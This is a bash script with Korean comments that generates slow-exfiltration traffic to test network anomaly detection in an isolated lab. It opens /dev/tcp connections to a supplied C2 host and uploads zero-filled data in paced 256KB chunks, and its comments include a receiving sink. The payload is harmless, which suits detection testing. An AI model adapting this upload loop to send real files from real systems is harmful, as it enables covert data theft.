#!/bin/bash
# 느린 유출(slow exfil) 생성기 — 네트워크 이상탐지 검증용(격리 실습망 전용, DD-020).
#
# 침해된 내부 호스트가 C2로 큰 데이터를 천천히, 나눠서 올린다. 창마다 업로드 하나(DD-008
# 합성 slow_exfil 패턴의 실제 버전). 비커닝(연결은 많지만 작음)·스캔(포트 fan-out)과 달리
# "연결은 적지만 바이트가 큰" 유형이라, 양 기반 특징이 fan-out 없이도 반응하는지 본다.
#
# 데이터는 /dev/zero(바이트 수만 의미 있다, Zeek는 orig_bytes로 센다). 외부 도구 없이
# bash /dev/tcp와 head만 쓴다. 한 업로드를 256KB씩 나눠 보내며 사이에 잠깐 쉬어 전송을
# 창 안에 펼친다(갑작스런 버스트가 아니라 천천히 새어 나가는 모양).
#
# C2 쪽(Kali)에서 받아 버리는 sink를 먼저 띄운다(끝까지 읽어야 전송이 끊기지 않는다):
#   python3 -c 'import socket
#   s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
#   s.bind(("0.0.0.0",4445)); s.listen(); print("exfil sink on 4445")
#   while True:
#       c,_=s.accept(); n=0
#       while True:
#           b=c.recv(65536)
#           if not b: break
#           n+=len(b)
#       print("recv",n,"bytes"); c.close()'
#
# 실행(타깃에서):
#   bash lab_exfil.sh 10.10.0.50 4445 300 4 1800
#   인자: C2주소 C2포트 업로드간격초 업로드크기MB 지속초
#   위 예: 5분(창)마다 4MB를 약 48초에 걸쳐 올림, 30분(업로드 약 6회).
set -uo pipefail

C2_HOST=${1:?C2 주소}
C2_PORT=${2:?C2 포트}
INTERVAL=${3:-300}          # 업로드 사이 간격(초). 300이면 창마다 하나.
SIZE_MB=${4:-4}             # 업로드 하나 크기(MB)
DURATION=${5:-1800}         # 총 지속(초)

CHUNK=262144                # 256KB씩 보낸다
CHUNK_DELAY=3               # 조각 사이 쉼(초). 4MB면 약 48초에 걸쳐 전송

LOG=~/exfil-$(date -u +%Y%m%dT%H%M%SZ).log
END=$(( $(date +%s) + DURATION ))
TOTAL=$(( SIZE_MB * 1024 * 1024 ))

mark() { echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) $*" | tee -a "$LOG"; }

# 업로드 하나: 연결을 열어 TOTAL 바이트를 256KB씩 보내고 닫는다.
send_upload() {
    exec 3<>/dev/tcp/"$C2_HOST"/"$C2_PORT" 2>/dev/null || return 1
    local sent=0 n
    while [ "$sent" -lt "$TOTAL" ]; do
        n=$CHUNK
        [ $((TOTAL - sent)) -lt "$CHUNK" ] && n=$((TOTAL - sent))
        head -c "$n" /dev/zero >&3 2>/dev/null || { exec 3<&- 3>&- 2>/dev/null; return 1; }
        sent=$((sent + n))
        sleep "$CHUNK_DELAY"
    done
    exec 3<&- 3>&- 2>/dev/null
    return 0
}

mark "exfil start -> ${C2_HOST}:${C2_PORT} interval=${INTERVAL}s size=${SIZE_MB}MB dur=${DURATION}s"
up=0
while [ "$(date +%s)" -lt "$END" ]; do
    up=$((up+1))
    t0=$(date +%s)
    if send_upload; then st=ok; else st=miss; fi
    mark "upload=$up ${SIZE_MB}MB $st ($(( $(date +%s) - t0 ))s)"
    # 다음 업로드까지: 간격에서 이미 쓴 전송 시간을 뺀다
    rest=$(( INTERVAL - ($(date +%s) - t0) ))
    [ "$rest" -gt 0 ] && sleep "$rest"
done
mark "exfil end uploads=$up"
echo "----- log: $LOG"
